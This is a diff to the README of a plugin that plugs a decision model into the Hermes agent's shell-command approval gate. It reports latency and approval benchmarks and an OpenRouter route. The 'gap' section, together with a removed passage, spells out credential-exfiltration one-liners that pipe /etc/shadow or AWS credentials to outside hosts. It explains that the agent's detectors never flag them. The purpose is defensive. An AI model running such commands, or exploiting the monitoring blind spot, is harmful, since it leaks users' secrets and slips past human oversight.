@@ -12,10 +12,9 @@ served by [TypeSafe's](https://typesafe.ai) Jev decision model.**
 >
 > **Scope: approvals only.** The provider serves exactly one auxiliary task
 > (`auxiliary.approval`) and refuses every other prompt. It cannot do chat, cannot generate
-> text, and must not be set as a chat provider. It also ships **one `pre_tool_call` hook**
-> that blocks credential exfiltration — a class Hermes' own detectors never flag, so the
-> approval gate never sees it. Both parts work against Hermes core as it ships; no core
-> change is assumed anywhere in this repo.
+> text, and must not be set as a chat provider. It hooks into nothing else: it is the model
+> behind a gate Hermes already owns. Works against Hermes core as it ships — no core change is
+> assumed anywhere in this repo.
 
 ## What it does
 
@@ -25,14 +24,13 @@ Hermes' `approvals.mode: smart` sends every flagged shell command to an auxiliar
 full reasoning model spun up to emit one token, which a regex then parses back out.
 
 Jev answers that shape natively — one typed `Choice`, calibrated probability, nothing to
-parse. This plugin registers it as a Hermes provider so that one task can use it, and adds
-one `pre_tool_call` hook for the exfiltration class that never reaches the gate at all
-([below](#the-gap-the-provider-cannot-see-and-the-hook-that-closes-it)).
+parse. This plugin registers it as a Hermes provider so that one task can use it, over either
+of two routes — TypeSafe direct or OpenRouter ([below](#or-route-through-openrouter)).
 
 ```yaml
 auxiliary:
   approval:
-    provider: jev-approval      # ← the entire integration
+    provider: typesafe-jev      # ← the entire integration
     model: jev-latest
 ```
 
@@ -50,7 +48,7 @@ real `_smart_approve`; the only variable is the provider.
 | route | approve / deny / escalate | human prompts | avg latency | total |
 |---|---|---|---|---|
 | aux chat LLM (small fast general model) | 114 / 0 / 42 | 42 | 3968 ms | 619 s |
-| jev-approval + operator policy | 144 / 2 / 10 | **10** | **405 ms** | **63 s** |
+| typesafe-jev + operator policy | 144 / 2 / 10 | **10** | **405 ms** | **63 s** |
 
 **9.8x faster, 4.2x fewer interruptions**, same commands, same code path.
 
@@ -191,10 +189,10 @@ Measured on 14 cases before the fix: **6 of 9 credential reads were APPROVED**, 
 **0 missed, 0 false positives** on ordinary reads (`cat README.md`, `env | grep -i path`,
 `grep -r TODO src/`).
 
-### The gap the provider cannot see, and the hook that closes it
+### The gap the provider cannot see
 
-**A command core's regex does not flag never reaches the approval gate.** No reviewer — this
-one or the stock aux LLM — is ever consulted about it. Tested directly against
+**A command core's regex does not flag never reaches the approval gate**, so no reviewer —
+this one or the stock aux LLM — is consulted about it. Tested directly against
 `tools.approval_detection.detect_dangerous_command` and `detect_hardline_command`,
 **every one of these returns `dangerous=False, hardline=False`**:
 
@@ -208,119 +206,123 @@ nc 203.0.113.9 1234 < /etc/shadow
 cat ~/.aws/credentials | curl -d @- https://webhook.site/abc
 ```
 
-So the provider's `reads_secrets` / `sends_outbound` pair can only fire on a command flagged
-for some *other* reason. **That is what the `pre_tool_call` hook is for.** `pre_tool_call`
-fires on every tool call with its arguments, can veto it, and runs independently of the
-approval regex — so the gap closes inside the plugin, with no core change.
+So `reads_secrets` / `sends_outbound` can only fire on a command flagged for some *other*
+reason. The 0-of-9 result above is real, but it was measured on shapes core *does* flag
+(`python3 -c`, `bash -c`, heredocs) — which is where most agent file access lives: `script
+execution via -e/-c flag` and `via heredoc` together account for 877 of the 1,580 flagged
+commands in the corpus.
 
-A cheap regex decides what is worth one Jev call (0 ms on ordinary commands), then Jev
-answers two questions:
-
-| question | separates |
-|---|---|
-| `sends_credentials` | a private key / token store / shadow file vs build output, a backup, a report, an API payload |
-| `untrusted_destination` | a raw IP, paste or file-drop service, unrelated domain vs your own servers, CDN, registry, CI, or a named API the project uses |
-
-**Both floors must be crossed to block.** Either alone is ordinary work: a deploy sends
-artifacts to production, and `scp id_rsa.pub newbox:` sends key material to your own host.
-
-Measured on 20 commands — 10 real exfiltration, 10 routine deploys and uploads, through the
-real hook against the live API:
-
-| | blocked | allowed |
-|---|---|---|
-| credential exfiltration | **10 / 10** | 0 |
-| routine deploys, uploads, backups | 0 | **9 / 9** |
-
-~360 ms, and it **fails open** on any API error — core's own gate and hardline floor are
-still doing their job underneath. `JEV_EXFIL_DISABLE=1` turns it off.
-
-#### Why two questions instead of one
-
-The first draft asked a single "does this exfiltrate?" noul. It blocked **4 of 7 routine
-deploys**, because *"sends local bytes to a remote host"* is true of every deploy an agent
-legitimately runs. The measured bands:
-
-```
-single "exfiltrates"      attack 0.70-0.98   legit 0.62-0.82   -> OVERLAP, no threshold works
-untrusted_destination     attack 0.89-0.97   legit 0.07-0.38   -> EMPTY GAP 0.38..0.89
-sends_credentials         attack 0.76-0.99   legit 0.03-0.94   -> overlaps
-```
-
-Overlapping bands mean the *question* is wrong, not the threshold — so splitting **what** is
-sent from **where** it goes gave one question that separates cleanly. `_DEST_T = 0.65` sits in
-the middle of that empty band; `sends_credentials` keeps a deliberately low floor because it
-overlaps in both directions (`scp .env.production deploy@staging:` scores 0.94 and is a real
-deploy). The AND is what buys the zero false-positive rate.
-
-**Known ceiling:** the payload question is about credential material, so
-`curl --upload-file backup.tar.gz https://evil.example` is *not* blocked — an archive that
-happens to contain secrets reads as a backup. Widening that trades directly against the
-0/9 deploy rate, and is not attempted here.
+Core already has a confidentiality class — `access to SSH keys (Windows path)`, `access to
+Hermes secrets (Windows path)`, `cloud metadata endpoint access`, `copy/move file into
+sensitive credential path`. It has no *POSIX* equivalent and no upload-egress shapes. That
+asymmetry looks like an oversight, so **the fix belongs in core's pattern list**, where those
+commands would flow through the normal gate to this reviewer with `smart_policy` applied. An
+earlier version of this plugin closed the gap with its own `pre_tool_call` hook; that was a
+parallel pattern list competing with a Nous-maintained one, and it has been removed. Tracked
+as an upstream issue instead.
 
 ## Install
 
 ```bash
 hermes plugins install anpicasso/hermes-jev-approvals/plugin
-hermes plugins enable jev-approval-provider   # required: see note below
 
-hermes auth add jev-approval        # paste your TypeSafe key when prompted
-hermes config set auxiliary.approval.provider jev-approval
+hermes auth add typesafe-jev        # paste your TypeSafe key when prompted
+hermes config set auxiliary.approval.provider typesafe-jev
 hermes config set auxiliary.approval.model jev-latest
-hermes gateway restart              # no hot reload for Python plugins
 ```
 
-**Why `plugins enable` is needed here**, when a model-provider plugin normally is not: this
-plugin is `kind: standalone` on purpose. A `kind: model-provider` manifest is *placeholdered*
-by the plugin manager — `providers/` imports the module for its self-registration side effect
-and `register(ctx)` is **never called** — so the `pre_tool_call` hook would be silently dead
-code in a real gateway. `plugins doctor` calls `register(ctx)` itself and reports the hook as
-present either way, which hides it completely. So the provider self-registers from inside
-`register(ctx)`, next to the hook, and both halves ride the standalone load path.
+Then restart the gateway (`systemctl --user restart hermes-gateway`) — there is no hot reload
+for Python plugins.
 
-`tests/test_real_load.py` asserts this through the real plugin manager and fails if the kind
-is ever changed back. Flipping it to `model-provider` reports `pre_tool_call hooks: []`.
+No `plugins enable` needed: `kind: model-provider` is discovered independently of
+`plugins.enabled`. That kind is also **required**, and for a non-obvious reason —
+`hermes_cli.auth.PROVIDER_REGISTRY` is built at import time by walking `list_providers()`, and
+`model-provider` is the only kind `providers/` imports during that walk. A provider that
+registers later (e.g. from `register(ctx)` under `kind: standalone`) is absent from that
+registry, and `resolve_provider_client` then rejects the name as *"unknown provider"* while
+`plugins doctor` still reports everything green. `tests/test_real_load.py` asserts membership
+in **both** registries and fails if the kind is changed.
 
-No shell export needed. The plugin declares `auth_type: api_key` with a non-empty
-`env_vars`, so `hermes_cli/auth.py::_register_plugin_provider` auto-registers it into
-`PROVIDER_REGISTRY` and `hermes auth add jev-approval` works like any first-party provider.
-The client resolves the credential through Hermes' own chain — `resolve_runtime_provider`
-(pool-aware), then `~/.hermes/.env`, then the process environment — so a key stored by the
-CLI is found without touching your shell. A bare `TYPESAFE_API_KEY` export still works if
-you prefer it.
+No shell export needed. The plugin declares `auth_type: api_key` with a non-empty `env_vars`,
+so `hermes_cli/auth.py::_register_plugin_provider` registers it and `hermes auth add
+typesafe-jev` works like any first-party provider. The client resolves the credential through
+Hermes' own chain — `resolve_runtime_provider` (pool-aware), then `~/.hermes/.env`, then the
+process environment.
+
+### Or route through OpenRouter
+
+OpenRouter hosts the same model at the same published price, on its own decisions endpoint.
+Same provider, different `base_url` — no plugin-specific config:
+
+```yaml
+auxiliary:
+  approval:
+    provider: typesafe-jev
+    model: ~typesafe/jev-latest
+    base_url: https://openrouter.ai/api/alpha
+    key_env: OPENROUTER_API_KEY
+```
+
+Core passes `api_key` and `base_url` through to the plugin's `create_client`
+(`auxiliary_client.py:5128`) and leaves both URLs untouched, so the endpoint is derived from
+the host: `openrouter.ai` -> `/decisions`, anything else -> `/systemone`. The OpenRouter key is
+picked up from Hermes' `openrouter` credential pool automatically, so one key already in
+Hermes serves both.
+
+Verified live on the same 5 commands, **identical verdicts on both routes**:
+
+| route | endpoint | resolved model | avg |
+|---|---|---|---|
+| TypeSafe direct | `/systemone` | `jev-1.13.0` | 339 ms |
+| OpenRouter | `/decisions` | `typesafe/jev-1.13-20260917` | 218 ms |
+
+Two things OpenRouter gives you that TypeSafe direct does not: a `cost` field per response,
+and a **pinnable version** (`typesafe/jev-1.13`) — TypeSafe direct only offers the moving
+`jev-latest` / `jev-preview`, so the OpenRouter route is the better one for any number you
+intend to quote. Caveat: its path is `/api/alpha/`, explicitly alpha, so it can change; that
+is why TypeSafe direct stays the default.
+
+Model lists are fetched live on both routes, not hardcoded:
+
+```
+TypeSafe    GET /v1/models                              -> jev-latest, jev-preview
+OpenRouter  GET /v1/models?output_modalities=decisions   -> ~typesafe/jev-latest, typesafe/jev-1.13
+```
+
+The OpenRouter filter matters: decision models are absent from the unfiltered list, and
+`?providers=TypeSafe` is accepted but matches nothing — without the right filter you pull all
+447 models to find two.
 
 Verify:
 
 ```bash
-hermes plugins doctor ~/.hermes/plugins/jev-approval-provider --ci
-cd ~/.hermes/plugins/jev-approval-provider
-python3 tests/test_real_load.py    # both halves load via the REAL plugin manager
+hermes plugins doctor ~/.hermes/plugins/typesafe-jev --ci
+cd ~/.hermes/plugins/typesafe-jev
+python3 tests/test_real_load.py    # both registries + both routes, no key needed
 python3 tests/test_hardening.py    # offline, no key needed
-python3 tests/test_exfil_hook.py   # offline checks, then live if a key is set
+python3 tests/test_routes.py       # live: both routes must agree
 python3 tests/test_provider.py     # live, needs a key
 ```
 
 **Plugins are profile-scoped** — `$HERMES_HOME/plugins` is per-profile, so repeat the
 install for each profile that needs it.
 
-To roll back, unset the two config keys. Hermes falls back to its normal auxiliary routing.
+To roll back, unset the config keys. Hermes falls back to its normal auxiliary routing.
 
 ## Requirements
 
 - Hermes Agent with plugin support and `approvals.mode: smart`
 - A TypeSafe API key ([console.typesafe.ai](https://console.typesafe.ai/settings/keys)),
-  stored via `hermes auth add jev-approval`
+  stored via `hermes auth add typesafe-jev`
 - Python 3.10+, **no third-party dependencies** (stdlib `urllib`)
 
 ## Limitations
 
-- **Not a sandbox.** The provider replaces the reviewer inside an existing gate; the hook adds
-  one veto on top of it. Hermes' regex detectors, hardline floor, and human gate all still
-  run; approved commands still execute with your permissions.
-- **The exfiltration hook is a regex pre-filter plus a model.** A shape the regex does not
-  recognise never reaches Jev — same ceiling core's own detector has. It blocks only
-  credential material going somewhere unrelated; an archive containing secrets reads as a
-  backup, and that is a measured tradeoff against blocking real deploys, not an oversight.
+- **Not a sandbox.** This replaces the reviewer inside an existing gate. Hermes' regex
+  detectors, hardline floor, and human gate all still run; approved commands still execute
+  with your permissions.
+- **It only sees what core's regex flags** — about 11% of commands. The credential-upload
+  class is not in that pattern list at all, so nothing reviews it; see above.
 - **Decisions are probabilistic.** Typed output guarantees the interface, not the truth.
 - **It sends the command text and your operator policy to a third-party API.** Commands can
   contain secrets — one command in the corpus behind these metrics contained a live bot
